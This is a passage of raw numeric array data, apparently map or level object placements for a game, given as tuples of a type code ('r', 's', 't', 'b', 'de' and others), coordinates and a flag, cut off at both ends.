273, 1], [1, "r", 86, 272, 1], [1, "r", 85, 271, 1], [1, "r", 86, 271, 1], [1, "r", 87, 272, 1], [1, "r", 55, 248, 1], [1, "r", 54, 248, 1], [1, "r", 56, 249, 1], [1, "r", 55, 249, 1], [1, "r", 55, 250, 1], [1, "r", 56, 250, 1], [1, "r", 57, 250, 1], [1, "r", 57, 249, 1], [1, "r", 59, 250, 1], [1, "r", 58, 250, 1], [1, "r", 60, 250, 1], [1, "r", 61, 251, 1], [1, "r", 60, 251, 1], [1, "r", 62, 251, 1], [1, "r", 62, 252, 1], [1, "r", 63, 252, 1], [1, "r", 58, 251, 1], [1, "r", 57, 251, 1], [1, "r", 56, 251, 1], [1, "r", 58, 252, 1], [1, "r", 57, 252, 1], [1, "r", 57, 253, 1], [1, "r", 58, 253, 1], [1, "r", 58, 254, 1], [1, "r", 59, 255, 1], [1, "r", 58, 255, 1], [1, "r", 57, 254, 1], [1, "r", 56, 252, 1], [1, "r", 55, 251, 1], [1, "r", 60, 255, 1], [1, "r", 61, 255, 1], [1, "r", 61, 256, 1], [1, "r", 60, 256, 1], [1, "r", 62, 256, 1], [1, "r", 62, 257, 1], [1, "r", 61, 257, 1], [1, "r", 64, 253, 1], [1, "r", 64, 254, 1], [1, "r", 65, 254, 1], [1, "r", 61, 250, 1], [1, "r", 64, 252, 1], [1, "r", 65, 253, 1], [1, "r", 66, 254, 1], [1, "r", 65, 255, 1], [1, "r", 64, 255, 1], [1, "r", 64, 256, 1], [1, "r", 65, 256, 1], [1, "r", 65, 257, 1], [1, "r", 64, 257, 1], [1, "r", 63, 257, 1], [1, "r", 62, 258, 1], [1, "r", 63, 258, 1], [1, "r", 64, 258, 1], [1, "r", 66, 255, 1], [1, "r", 66, 256, 1], [1, "r", 66, 257, 1], [1, "r", 66, 258, 1], [1, "r", 65, 258, 1], [1, "r", 67, 258, 1], [1, "r", 67, 257, 1], [1, "r", 67, 259, 1], [1, "r", 66, 259, 1], [1, "r", 65, 259, 1], [1, "r", 56, 246, 1], [1, "r", 56, 245, 1], [1, "r", 68, 258, 1], [1, "r", 68, 259, 1], [1, "r", 68, 260, 1], [1, "r", 69, 260, 1], [1, "r", 69, 261, 1], [1, "r", 70, 261, 1], [1, "r", 71, 261, 1], [1, "r", 67, 260, 1], [1, "r", 89, 269, 1], [1, "r", 89, 268, 1], [1, "r", 90, 268, 1], [1, "r", 82, 267, 1], [1, "r", 83, 267, 1], [1, "r", 80, 266, 1], [1, "r", 81, 266, 1], [1, "r", 81, 267, 1], [1, "r", 79, 266, 1], [1, "r", 78, 265, 1], [1, "r", 77, 265, 1], [1, "r", 76, 264, 1], [1, "r", 75, 264, 1], [1, "r", 75, 263, 1], [1, "r", 74, 263, 1], [1, "r", 74, 262, 1], [1, "r", 72, 262, 1], [1, "r", 73, 262, 1], [1, "r", 71, 262, 1], [1, "r", 85, 270, 1], [1, "r", 84, 270, 1], [1, "r", 84, 269, 1], [1, "r", 83, 269, 1], [1, "r", 82, 269, 1], [1, "r", 81, 269, 1], [1, "r", 81, 268, 1], [1, "r", 82, 268, 1], [1, "r", 83, 268, 1], [1, "r", 80, 268, 1], [1, "r", 80, 267, 1], [1, "r", 79, 267, 1], [1, "r", 78, 266, 1], [1, "r", 76, 265, 1], [1, "r", 75, 262, 1], [1, "r", 90, 280, 1], [1, "r", 89, 280, 1], [1, "r", 89, 279, 1], [1, "r", 88, 279, 1], [1, "r", 88, 278, 1], [1, "r", 87, 277, 1], [1, "r", 86, 276, 1], [1, "r", 86, 275, 1], [1, "r", 86, 274, 1], [1, "r", 86, 273, 1], [1, "r", 85, 273, 1], [1, "r", 85, 272, 1], [1, "r", 85, 274, 1], [1, "r", 86, 277, 1], [1, "r", 87, 278, 1], [1, "r", 84, 271, 1], [1, "r", 83, 270, 1], [1, "r", 87, 273, 1], [1, "r", 91, 274, 1], [1, "r", 89, 273, 1], [1, "r", 88, 272, 1], [1, "r", 91, 281, 1], [1, "r", 92, 282, 1], [1, "r", 88, 280, 1], [1, "r", 87, 279, 1], [1, "r", 85, 275, 1], [1, "r", 84, 273, 1], [1, "r", 84, 272, 1], [1, "r", 83, 271, 1], [1, "r", 82, 270, 1], [1, "r", 84, 267, 0], [1, "r", 85, 267, 0], [1, "r", 76, 262, 0], [1, "r", 77, 262, 0], [1, "r", 88, 268, 0], [1, "r", 78, 262, 0], [1, "r", 79, 262, 0], [1, "r", 80, 262, 0], [1, "r", 80, 263, 0], [1, "r", 81, 263, 0], [1, "r", 82, 263, 0], [1, "r", 83, 263, 0], [1, "r", 84, 263, 0], [1, "r", 85, 263, 0], [1, "r", 88, 262, 0], [1, "r", 89, 262, 0], [1, "r", 90, 262, 0], [1, "r", 87, 262, 0], [1, "r", 86, 262, 0], [1, "r", 86, 263, 0], [1, "r", 87, 263, 0], [1, "r", 91, 262, 0], [1, "r", 95, 262, 0], [1, "r", 94, 262, 0], [1, "r", 86, 267, 0], [1, "r", 87, 267, 0], [1, "r", 87, 268, 0], [1, "r", 86, 268, 0], [1, "r", 74, 189, 0], [1, "r", 75, 189, 0], [1, "r", 76, 189, 0], [1, "r", 77, 189, 0], [1, "r", 78, 190, 0], [1, "r", 77, 190, 0], [1, "r", 75, 190, 0], [1, "r", 76, 190, 0], [1, "r", 74, 190, 0], [1, "r", 73, 190, 0], [1, "r", 78, 191, 0], [1, "r", 76, 191, 0], [1, "r", 77, 191, 0], [1, "r", 75, 191, 0], [1, "r", 74, 191, 0], [1, "r", 78, 192, 0], [1, "r", 77, 192, 0], [1, "r", 76, 192, 0], [1, "r", 75, 192, 0], [1, "r", 74, 192, 0], [1, "r", 73, 191, 0], [1, "f", 1, 96, 22, 1], [1, "s", 1, 97, 22, 1], [1, "f", 1, 98, 22, 1], [1, "s", 0, 99, 22, 1], [1, "s", 1, 100, 21, 1], [1, "s", 1, 96, 49, 1], [1, "s", 1, 100, 50, 1], [1, "s", 0, 99, 49, 1], [1, "s", 0, 97, 49, 1], [1, "f", 1, 98, 49, 1], [1, "r", 70, 218, 0], [1, "r", 71, 218, 0], [1, "r", 72, 218, 0], [1, "r", 73, 218, 0], [1, "r", 74, 219, 0], [1, "r", 73, 219, 0], [1, "r", 72, 219, 0], [1, "r", 71, 219, 0], [1, "r", 70, 219, 0], [1, "r", 73, 220, 0], [1, "r", 72, 220, 0], [1, "r", 71, 220, 0], [1, "r", 72, 221, 0], [1, "r", 71, 221, 0], [1, "r", 70, 221, 0], [1, "r", 69, 221, 0], [1, "r", 68, 221, 0], [1, "r", 70, 220, 0], [1, "r", 69, 220, 0], [1, "r", 69, 219, 0], [1, "r", 68, 220, 0], [1, "r", 73, 221, 0], [1, "r", 73, 222, 0], [1, "r", 71, 222, 0], [1, "r", 72, 222, 0], [1, "r", 74, 221, 0], [1, "r", 74, 220, 0], [1, "r", 75, 220, 0], [1, "r", 75, 221, 0], [1, "r", 70, 222, 0], [1, "r", 69, 222, 0], [1, "r", 29, 217, 0], [1, "r", 30, 217, 0], [1, "r", 31, 217, 0], [1, "r", 32, 217, 0], [1, "r", 31, 219, 0], [1, "r", 30, 219, 0], [1, "r", 29, 219, 0], [1, "r", 27, 219, 0], [1, "r", 25, 219, 0], [1, "r", 26, 219, 0], [1, "r", 28, 219, 0], [1, "r", 26, 218, 0], [1, "r", 27, 218, 0], [1, "r", 28, 218, 0], [1, "r", 29, 218, 0], [1, "r", 30, 218, 0], [1, "r", 28, 217, 0], [1, "r", 26, 217, 0], [1, "r", 27, 217, 0], [1, "r", 28, 216, 0], [1, "r", 29, 216, 0], [1, "r", 30, 216, 0], [1, "r", 31, 218, 0], [1, "r", 32, 218, 0], [1, "r", 31, 216, 0], [1, "r", 31, 221, 0], [1, "r", 31, 220, 0], [1, "r", 30, 220, 0], [1, "r", 29, 220, 0], [1, "r", 28, 220, 0], [1, "r", 27, 220, 0], [1, "r", 26, 220, 0], [1, "r", 25, 218, 0], [1, "r", 27, 221, 0], [1, "r", 28, 221, 0], [1, "r", 29, 221, 0], [1, "r", 30, 221, 0], [1, "r", 32, 220, 0], [1, "r", 32, 219, 0], [1, "r", 33, 218, 0], [1, "r", 33, 219, 0], [1, "r", 75, 238, 0], [1, "r", 76, 238, 0], [1, "r", 77, 239, 0], [1, "r", 76, 239, 0], [1, "r", 75, 239, 0], [1, "r", 74, 239, 0], [1, "r", 76, 240, 0], [1, "r", 77, 240, 0], [1, "r", 78, 240, 0], [1, "r", 77, 241, 0], [1, "r", 76, 241, 0], [1, "r", 75, 241, 0], [1, "r", 75, 240, 0], [1, "r", 74, 240, 0], [1, "r", 78, 239, 0], [1, "r", 77, 238, 0], [1, "r", 18, 253, 0], [1, "r", 19, 252, 0], [1, "r", 20, 252, 0], [1, "r", 21, 253, 0], [1, "r", 23, 254, 0], [1, "r", 20, 254, 0], [1, "r", 19, 254, 0], [1, "r", 22, 254, 0], [1, "r", 18, 254, 0], [1, "r", 19, 253, 0], [1, "r", 20, 253, 0], [1, "r", 21, 254, 0], [1, "r", 22, 253, 0], [1, "r", 21, 255, 0], [1, "r", 20, 255, 0], [1, "r", 19, 255, 0], [1, "r", 18, 255, 0], [1, "r", 17, 255, 0], [1, "r", 17, 254, 0], [1, "r", 22, 255, 0], [1, "r", 19, 256, 0], [1, "r", 20, 256, 0], [1, "r", 21, 256, 0], [1, "r", 39, 270, 0], [1, "r", 40, 270, 0], [1, "r", 41, 270, 0], [1, "r", 43, 270, 0], [1, "r", 44, 270, 0], [1, "r", 46, 270, 0], [1, "r", 42, 270, 0], [1, "r", 45, 270, 0], [1, "r", 44, 269, 0], [1, "r", 43, 269, 0], [1, "r", 42, 269, 0], [1, "r", 40, 269, 0], [1, "r", 41, 269, 0], [1, "r", 45, 271, 0], [1, "r", 44, 271, 0], [1, "r", 43, 271, 0], [1, "r", 42, 271, 0], [1, "r", 41, 271, 0], [1, "r", 40, 271, 0], [1, "r", 39, 271, 0], [1, "r", 46, 271, 0], [1, "r", 45, 272, 0], [1, "r", 44, 272, 0], [1, "r", 43, 272, 0], [1, "r", 42, 272, 0], [1, "r", 19, 284, 0], [1, "r", 20, 284, 0], [1, "r", 21, 285, 0], [1, "r", 22, 285, 0], [1, "r", 23, 286, 0], [1, "r", 22, 288, 0], [1, "r", 20, 288, 0], [1, "r", 18, 288, 0], [1, "r", 17, 287, 0], [1, "r", 16, 287, 0], [1, "r", 16, 286, 0], [1, "r", 17, 286, 0], [1, "r", 18, 286, 0], [1, "r", 19, 286, 0], [1, "r", 20, 286, 0], [1, "r", 21, 286, 0], [1, "r", 22, 286, 0], [1, "r", 20, 285, 0], [1, "r", 19, 285, 0], [1, "r", 18, 285, 0], [1, "r", 17, 285, 0], [1, "r", 19, 287, 0], [1, "r", 18, 287, 0], [1, "r", 20, 287, 0], [1, "r", 21, 287, 0], [1, "r", 22, 287, 0], [1, "r", 23, 287, 0], [1, "r", 21, 288, 0], [1, "r", 19, 288, 0], [1, "r", 17, 288, 0], [1, "r", 19, 289, 0], [1, "r", 21, 289, 0], [1, "r", 22, 289, 0], [1, "r", 20, 289, 0], [1, "r", 23, 288, 0], [1, "r", 24, 287, 0], [1, "r", 24, 286, 0], [1, "r", 23, 285, 0], [1, "r", 66, 286, 0], [1, "r", 64, 287, 0], [1, "r", 63, 287, 0], [1, "r", 60, 287, 0], [1, "r", 59, 285, 0], [1, "r", 58, 284, 0], [1, "r", 59, 283, 0], [1, "r", 65, 283, 0], [1, "r", 64, 283, 0], [1, "r", 63, 283, 0], [1, "r", 62, 283, 0], [1, "r", 61, 283, 0], [1, "r", 60, 283, 0], [1, "r", 59, 284, 0], [1, "r", 58, 285, 0], [1, "r", 60, 286, 0], [1, "r", 59, 286, 0], [1, "r", 61, 287, 0], [1, "r", 62, 287, 0], [1, "r", 61, 286, 0], [1, "r", 62, 286, 0], [1, "r", 63, 286, 0], [1, "r", 64, 286, 0], [1, "r", 65, 286, 0], [1, "r", 67, 285, 0], [1, "r", 66, 285, 0], [1, "r", 65, 285, 0], [1, "r", 64, 285, 0], [1, "r", 63, 285, 0], [1, "r", 62, 285, 0], [1, "r", 61, 285, 0], [1, "r", 60, 285, 0], [1, "r", 60, 284, 0], [1, "r", 61, 284, 0], [1, "r", 62, 284, 0], [1, "r", 63, 284, 0], [1, "r", 64, 284, 0], [1, "r", 65, 284, 0], [1, "r", 66, 284, 0], [1, "r", 65, 287, 0], [1, "r", 67, 286, 0], [1, "p", 0, 13, 189, 1], [1, "p", 0, 32, 184, 1], [1, "p", 0, 47, 191, 1], [1, "p", 0, 64, 184, 1], [1, "p", 0, 84, 192, 1], [1, "p", 0, 78, 207, 1], [1, "p", 0, 58, 216, 1], [1, "p", 0, 41, 211, 1], [1, "p", 0, 18, 211, 1], [1, "p", 0, 14, 230, 1], [1, "p", 0, 29, 237, 1], [1, "p", 0, 50, 230, 1], [1, "p", 0, 78, 241, 1], [1, "p", 0, 74, 256, 1], [1, "p", 0, 68, 266, 1], [1, "p", 0, 48, 259, 1], [1, "p", 0, 31, 263, 1], [1, "p", 0, 18, 274, 1], [1, "p", 0, 33, 283, 1], [1, "p", 0, 66, 287, 1], [1, "p", 0, 82, 291, 1], [1, "p", 0, 16, 295, 1], [1, "p", 0, 45, 294, 1], [1, "p", 0, 18, 252, 1], [1, "p", 0, 79, 227, 1], [1, "p", 0, 32, 200, 1], [1, "p", 0, 64, 200, 1], [1, "s", 0, 21, 193, 1], [1, "s", 1, 18, 189, 1], [1, "s", 2, 26, 189, 1], [1, "b", 1, 15, 181, 0], [1, "b", 2, 18, 190, 0], [1, "b", 2, 29, 193, 0], [1, "t", 3, 16, 182, 0], [1, "t", 3, 13, 195, 0], [1, "t", 4, 16, 183, 0], [1, "t", 5, 10, 184, 0], [1, "t", 5, 23, 182, 0], [1, "t", 4, 30, 187, 0], [1, "t", 1, 26, 192, 0], [1, "b", 1, 25, 188, 0], [1, "s", 1, 24, 181, 1], [1, "t", 3, 33, 183, 0], [1, "b", 1, 36, 189, 0], [1, "t", 2, 35, 190, 0], [1, "b", 3, 19, 200, 0], [1, "s", 0, 28, 194, 1], [1, "s", 1, 32, 196, 1], [1, "s", 1, 36, 183, 1], [1, "s", 2, 38, 184, 1], [1, "s", 2, 10, 192, 1], [1, "s", 2, 12, 183, 1], [1, "s", 1, 15, 199, 1], [1, "b", 0, 12, 202, 0], [1, "t", 2, 13, 203, 0], [1, "t", 4, 20, 200, 0], [1, "t", 4, 12, 194, 0], [1, "t", 5, 15, 205, 0], [1, "t", 5, 29, 200, 0], [1, "t", 3, 28, 201, 0], [1, "s", 2, 25, 199, 1], [1, "s", 1, 22, 204, 1], [1, "g", 2, 25, 205, 1], [1, "b", 1, 27, 216, 0], [1, "s", 1, 25, 217, 1], [1, "s", 1, 33, 217, 1], [1, "s", 2, 35, 215, 1], [1, "s", 0, 32, 221, 1], [1, "t", 2, 31, 222, 0], [1, "t", 4, 26, 221, 0], [1, "b", 3, 27, 222, 0], [1, "b", 0, 17, 217, 0], [1, "t", 3, 18, 216, 0], [1, "t", 4, 13, 215, 0], [1, "t", 5, 30, 213, 0], [1, "t", 5, 24, 208, 0], [1, "s", 1, 12, 216, 1], [1, "s", 2, 11, 210, 1], [1, "s", 2, 34, 223, 1], [1, "b", 2, 36, 218, 0], [1, "t", 4, 40, 206, 0], [1, "t", 5, 35, 203, 0], [1, "t", 3, 39, 206, 0], [1, "b", 1, 34, 204, 0], [1, "s", 1, 33, 206, 1], [1, "s", 1, 42, 203, 1], [1, "s", 0, 47, 196, 1], [1, "b", 2, 40, 196, 0], [1, "t", 4, 39, 197, 0], [1, "t", 5, 44, 187, 0], [1, "b", 1, 46, 181, 0], [1, "t", 2, 47, 182, 0], [1, "b", 0, 57, 182, 0], [1, "b", 3, 56, 183, 0], [1, "t", 4, 55, 184, 0], [1, "t", 5, 62, 195, 0], [1, "s", 1, 51, 185, 1], [1, "s", 2, 62, 180, 1], [1, "s", 2, 61, 188, 1], [1, "s", 1, 61, 189, 1], [1, "s", 2, 48, 195, 1], [1, "b", 1, 51, 199, 0], [1, "t", 2, 52, 199, 0], [1, "t", 3, 56, 204, 0], [1, "t", 4, 57, 204, 0], [1, "t", 4, 51, 204, 0], [1, "s", 1, 52, 205, 1], [1, "s", 2, 57, 200, 1], [1, "s", 1, 56, 199, 1], [1, "b", 0, 55, 192, 0], [1, "t", 3, 56, 193, 0], [1, "t", 4, 50, 190, 0], [1, "b", 1, 76, 188, 0], [1, "t", 2, 75, 188, 0], [1, "t", 2, 73, 192, 0], [1, "t", 4, 72, 191, 0], [1, "t", 5, 78, 193, 0], [1, "b", 0, 79, 192, 0], [1, "s", 2, 79, 190, 1], [1, "s", 1, 74, 194, 1], [1, "s", 1, 72, 187, 1], [1, "s", 0, 74, 183, 1], [1, "s", 1, 75, 183, 1], [1, "t", 2, 69, 181, 0], [1, "t", 4, 70, 182, 0], [1, "t", 5, 69, 180, 0], [1, "b", 1, 65, 189, 0], [1, "b", 2, 66, 189, 0], [1, "t", 3, 64, 188, 0], [1, "t", 4, 67, 192, 0], [1, "b", 2, 85, 183, 0], [1, "t", 1, 84, 184, 0], [1, "t", 4, 81, 180, 0], [1, "t", 5, 89, 180, 0], [1, "t", 0, 90, 188, 0], [1, "t", 3, 89, 190, 0], [1, "s", 1, 87, 187, 1], [1, "s", 2, 87, 197, 1], [1, "b", 1, 84, 200, 0], [1, "t", 2, 83, 201, 0], [1, "t", 4, 87, 207, 0], [1, "s", 2, 79, 202, 1], [1, "s", 1, 80, 203, 1], [1, "t", 0, 71, 200, 0], [1, "b", 2, 72, 201, 0], [1, "t", 2, 65, 205, 0], [1, "t", 1, 66, 206, 0], [1, "t", 4, 63, 209, 0], [1, "t", 5, 73, 203, 0], [1, "s", 0, 70, 207, 1], [1, "s", 1, 71, 206, 1], [1, "s", 2, 68, 199, 1], [1, "s", 1, 64, 213, 1], [1, "t", 0, 85, 213, 0], [1, "b", 2, 84, 212, 0], [1, "t", 3, 77, 209, 0], [1, "t", 4, 83, 216, 0], [1, "t", 4, 73, 209, 0], [1, "b", 0, 86, 222, 0], [1, "b", 3, 87, 221, 0], [1, "s", 1, 80, 214, 1], [1, "s", 2, 87, 216, 1], [1, "s", 2, 84, 224, 1], [1, "s", 1, 77, 227, 1], [1, "t", 1, 74, 222, 0], [1, "b", 1, 69, 218, 0], [1, "b", 2, 75, 219, 0], [1, "s", 2, 74, 218, 1], [1, "s", 1, 69, 223, 1], [1, "s", 1, 77, 221, 1], [1, "b", 1, 72, 211, 0], [1, "b", 1, 85, 232, 0], [1, "t", 2, 84, 233, 0], [1, "t", 2, 78, 238, 0], [1, "b", 1, 77, 237, 0], [1, "t", 5, 87, 236, 0], [1, "t", 5, 76, 229, 0], [1, "b", 2, 74, 241, 0], [1, "s", 0, 73, 242, 1], [1, "s", 0, 81, 238, 1], [1, "s", 1, 82, 237, 1], [1, "s", 2, 72, 237, 1], [1, "s", 2, 78, 242, 1], [1, "b", 1, 66, 230, 0], [1, "b", 2, 62, 229, 0], [1, "t", 4, 67, 231, 0], [1, "t", 4, 62, 228, 0], [1, "t", 5, 64, 233, 0], [1, "t", 2, 65, 234, 0], [1, "t", 2, 51, 220, 0], [1, "t", 1, 50, 218, 0], [1, "b", 1, 45, 223, 0], [1, "b", 2, 46, 224, 0], [1, "t", 4, 49, 218, 0], [1, "t", 4, 47, 225, 0], [1, "s", 1, 50, 215, 1], [1, "s", 2, 51, 213, 1], [1, "s", 2, 42, 227, 1], [1, "s", 1, 44, 227, 1], [1, "s", 1, 60, 230, 1], [1, "s", 2, 59, 231, 1], [1, "b", 1, 85, 252, 0], [1, "t", 2, 84, 251, 0], [1, "t", 2, 74, 250, 0], [1, "t", 0, 75, 251, 0], [1, "b", 0, 83, 246, 0], [1, "t", 3, 82, 247, 0], [1, "t", 4, 81, 259, 0], [1, "t", 4, 69, 249, 0], [1, "t", 5, 87, 246, 0], [1, "t", 5, 75, 252, 0], [1, "s", 1, 79, 257, 1], [1, "s", 2, 78, 249, 1], [1, "s", 2, 80, 258, 1], [1, "s", 1, 88, 254, 1], [1, "s", 1, 85, 264, 1], [1, "s", 2, 89, 263, 1], [1, "s", 2, 87, 269, 1], [1, "s", 0, 84, 268, 1], [1, "s", 2, 76, 267, 1], [1, "s", 1, 66, 261, 1], [1, "s", 1, 87, 274, 1], [1, "s", 1, 76, 263, 1], [1, "s", 1, 59, 251, 1], [1, "s", 0, 59, 252, 1], [1, "t", 2, 86, 265, 0], [1, "t", 0, 78, 270, 0], [1, "t", 2, 79, 271, 0], [1, "t", 0, 77, 260, 0], [1, "t", 3, 78, 261, 0], [1, "b", 1, 71, 264, 0], [1, "b", 1, 88, 269, 0], [1, "t", 5, 84, 264, 0], [1, "t", 5, 79, 261, 0], [1, "t", 5, 72, 265, 0], [1, "t", 5, 77, 270, 0], [1, "t", 0, 87, 261, 0], [1, "t", 2, 86, 260, 0], [1, "t", 4, 84, 255, 0], [1, "t", 4, 68, 255, 0], [1, "t", 1, 67, 254, 0], [1, "t", 2, 65, 262, 0], [1, "t", 1, 57, 260, 0], [1, "t", 2, 58, 259, 0], [1, "b", 1, 63, 256, 0], [1, "b", 1, 52, 248, 0], [1, "t", 2, 53, 248, 0], [1, "s", 1, 50, 253, 1], [1, "s", 2, 67, 263, 1], [1, "s", 2, 52, 252, 1], [1, "s", 2, 71, 244, 1], [1, "b", 0, 57, 245, 0], [1, "t", 2, 58, 244, 0], [1, "b", 1, 53, 237, 0], [1, "t", 2, 54, 237, 0], [1, "t", 2, 41, 238, 0], [1, "t", 1, 42, 237, 0], [1, "t", 5, 57, 235, 0], [1, "t", 5, 60, 246, 0], [1, "t", 5, 50, 252, 0], [1, "t", 1, 42, 248, 0], [1, "b", 1, 43, 249, 0], [1, "b", 3, 37, 243, 0], [1, "s", 0, 50, 236, 1], [1, "s", 2, 39, 247, 1], [1, "s", 2, 51, 235, 1], [1, "s", 2, 60, 243, 1], [1, "s", 2, 36, 240, 1], [1, "s", 2, 43, 254, 1], [1, "s", 1, 42, 254, 1], [1, "t", 1, 38, 233, 0], [1, "t", 2, 35, 235, 0], [1, "t", 4, 33, 228, 0], [1, "t", 4, 33, 245, 0], [1, "t", 4, 43, 235, 0], [1, "t", 5, 45, 249, 0], [1, "t", 5, 41, 253, 0], [1, "b", 1, 20, 227, 0], [1, "b", 1, 14, 240, 0], [1, "t", 3, 21, 227, 0], [1, "t", 3, 27, 234, 0], [1, "t", 3, 15, 241, 0], [1, "t", 3, 12, 229, 0], [1, "t", 4, 17, 224, 0], [1, "t", 4, 11, 231, 0], [1, "t", 4, 22, 238, 0], [1, "t", 4, 11, 239, 0], [1, "t", 1, 22, 243, 0], [1, "b", 2, 23, 242, 0], [1, "s", 1, 23, 238, 1], [1, "s", 1, 22, 228, 1], [1, "s", 2, 24, 228, 1], [1, "s", 2, 21, 236, 1], [1, "s", 0, 13, 228, 1], [1, "s", 0, 16, 242, 1], [1, "s", 1, 15, 244, 1], [1, "s", 1, 34, 236, 1], [1, "t", 1, 26, 249, 0], [1, "t", 1, 22, 256, 0], [1, "t", 2, 23, 255, 0], [1, "b", 1, 17, 256, 0], [1, "b", 2, 18, 256, 0], [1, "s", 0, 21, 252, 1], [1, "s", 2, 20, 250, 1], [1, "s", 2, 23, 259, 1], [1, "s", 1, 13, 257, 1], [1, "t", 1, 31, 254, 0], [1, "t", 2, 32, 254, 0], [1, "t", 4, 28, 254, 0], [1, "t", 4, 34, 258, 0], [1, "t", 0, 29, 260, 0], [1, "b", 2, 30, 261, 0], [1, "t", 0, 43, 262, 0], [1, "t", 2, 42, 263, 0], [1, "t", 4, 46, 264, 0], [1, "b", 1, 39, 265, 0], [1, "b", 1, 58, 267, 0], [1, "t", 2, 57, 268, 0], [1, "t", 4, 62, 270, 0], [1, "t", 5, 52, 273, 0], [1, "s", 1, 52, 269, 1], [1, "s", 1, 41, 272, 1], [1, "s", 2, 41, 274, 1], [1, "t", 2, 42, 268, 0], [1, "t", 0, 43, 268, 0], [1, "b", 1, 46, 272, 0], [1, "b", 1, 14, 265, 0], [1, "t", 2, 15, 266, 0], [1, "t", 4, 19, 264, 0], [1, "t", 4, 29, 263, 0], [1, "t", 4, 11, 269, 0], [1, "t", 1, 29, 271, 0], [1, "b", 2, 28, 272, 0], [1, "t", 2, 24, 267, 0], [1, "t", 2, 20, 279, 0], [1, "t", 0, 19, 278, 0], [1, "t", 3, 13, 278, 0], [1, "b", 0, 21, 284, 0], [1, "b", 0, 18, 289, 0], [1, "t", 2, 20, 283, 0], [1, "t", 2, 19, 290, 0], [1, "t", 4, 19, 283, 0], [1, "t", 4, 20, 290, 0], [1, "s", 1, 16, 285, 1], [1, "s", 1, 24, 288, 1], [1, "s", 2, 26, 287, 1], [1, "s", 2, 16, 278, 1], [1, "s", 1, 21, 268, 1], [1, "s", 2, 19, 268, 1], [1, "t", 0, 12, 294, 0], [1, "b", 1, 13, 295, 0], [1, "t", 3, 13, 291, 0], [1, "t", 3, 10, 299, 0], [1, "t", 4, 11, 287, 0], [1, "t", 4, 17, 298, 0], [1, "t", 1, 27, 294, 0], [1, "b", 2, 26, 295, 0], [1, "t", 3, 33, 297, 0], [1, "b", 1, 48, 278, 0], [1, "b", 0, 46, 280, 0], [1, "b", 2, 50, 280, 0], [1, "t", 0, 44, 282, 0], [1, "b", 1, 49, 283, 0], [1, "b", 0, 51, 278, 0], [1, "b", 3, 50, 279, 0], [1, "b", 3, 44, 284, 0], [1, "b", 0, 47, 284, 0], [1, "b", 2, 42, 283, 0], [1, "t", 4, 51, 277, 0], [1, "b", 1, 44, 286, 0], [1, "b", 2, 46, 286, 0], [1, "b", 1, 42, 285, 0], [1, "b", 3, 41, 286, 0], [1, "t", 5, 42, 287, 0], [1, "b", 1, 42, 278, 0], [1, "b", 2, 43, 279, 0], [1, "b", 0, 40, 280, 0], [1, "t", 4, 39, 283, 0], [1, "t", 4, 39, 279, 0], [1, "t", 5, 43, 277, 0], [1, "t", 5, 47, 287, 0], [1, "t", 4, 46, 277, 0], [1, "t", 4, 45, 290, 0], [1, "t", 4, 36, 285, 0], [1, "t", 3, 35, 284, 0], [1, "t", 3, 36, 272, 0], [1, "t", 4, 35, 271, 0], [1, "t", 1, 29, 279, 0], [1, "b", 1, 32, 277, 0], [1, "t", 3, 31, 278, 0], [1, "b", 2, 28, 280, 0], [1, "t", 4, 29, 286, 0], [1, "t", 5, 28, 275, 0], [1, "t", 3, 37, 292, 0], [1, "b", 1, 36, 291, 0], [1, "b", 0, 34, 298, 0], [1, "t", 4, 31, 292, 0], [1, "t", 4, 46, 295, 0], [1, "t", 4, 59, 287, 0], [1, "b", 1, 58, 286, 0], [1, "s", 1, 68, 284, 1], [1, "s", 2, 70, 286, 1], [1, "s", 0, 67, 284, 1], [1, "t", 3, 66, 283, 0], [1, "t", 1, 65, 282, 0], [1, "b", 1, 64, 288, 0], [1, "t", 3, 60, 293, 0], [1, "t", 1, 61, 294, 0], [1, "b", 1, 76, 294, 0], [1, "t", 5, 75, 295, 0], [1, "t", 5, 56, 293, 0], [1, "t", 5, 59, 281, 0], [1, "t", 5, 67, 291, 0], [1, "b", 0, 88, 293, 0], [1, "t", 2, 89, 292, 0], [1, "t", 2, 85, 286, 0], [1, "t", 4, 88, 289, 0], [1, "t", 4, 79, 287, 0], [1, "b", 1, 84, 285, 0], [1, "t", 3, 75, 284, 0], [1, "b", 0, 75, 278, 0], [1, "t", 3, 74, 277, 0], [1, "t", 4, 81, 276, 0], [1, "t", 2, 65, 276, 0], [1, "b", 1, 66, 275, 0], [1, "g", 0, 45, 261, 1], [1, "g", 1, 39, 258, 1], [1, "g", 0, 35, 250, 1], [1, "g", 2, 22, 247, 1], [1, "g", 2, 27, 227, 1], [1, "g", 2, 63, 218, 1], [1, "g", 1, 56, 224, 1], [1, "g", 0, 46, 231, 1], [1, "g", 1, 65, 240, 1], [1, "g", 2, 67, 238, 1], [1, "g", 2, 79, 232, 1], [1, "g", 2, 72, 253, 1], [1, "g", 2, 62, 264, 1], [1, "g", 2, 28, 267, 1], [1, "g", 2, 58, 274, 1], [1, "de", 2, 14, 182, 0], [1, "de", 2, 24, 182, 0], [1, "de", 0, 11, 185, 0], [1, "de", 0, 14, 194, 0], [1, "de", 1, 25, 196, 0], [1, "de", 3, 31, 183, 0], [1, "de", 0, 38, 181, 0], [1, "de", 2, 45, 186, 0], [1, "de", 1, 38, 191, 0], [1, "de", 0, 56, 181, 0], [1, "de", 1, 68, 182, 0], [1, "de", 2, 80, 181, 0], [1, "de", 3, 86, 187, 0], [1, "de", 0, 84, 193, 0], [1, "de", 1, 82, 201, 0], [1, "de", 2, 64, 191, 0], [1, "de", 2, 72, 200, 0], [1, "de", 3, 64, 201, 0], [1, "de", 2, 76, 209, 0], [1, "de", 3, 71, 212, 0], [1, "de", 1, 86, 214, 0], [1, "de", 0, 57, 208, 0], [1, "de", 0, 41, 203, 0], [1, "de", 1, 15, 206, 0], [1, "de", 2, 25, 209, 0], [1, "de", 3, 16, 218, 0], [1, "de", 3, 11, 227, 0], [1, "de", 0, 22, 229, 0], [1, "de", 1, 15, 239, 0], [1, "de", 2, 24, 238, 0], [1, "de", 3, 22, 246, 0], [1, "de", 3, 10, 253, 0], [1, "de", 1, 18, 258, 0], [1, "de", 1, 28, 261, 0], [1, "de", 1, 14, 267, 0], [1, "de", 0, 24, 268, 0], [1, "de", 0, 15, 278, 0], [1, "de", 2, 21, 279, 0], [1, "de", 2, 30, 272, 0], [1, "de", 2, 29, 281, 0], [1, "de", 2, 15, 284, 0], [1, "de", 3, 12, 291, 0], [1, "de", 3, 30, 287, 0], [1, "de", 3, 27, 293, 0], [1, "de", 0, 25, 296, 0], [1, "de", 0, 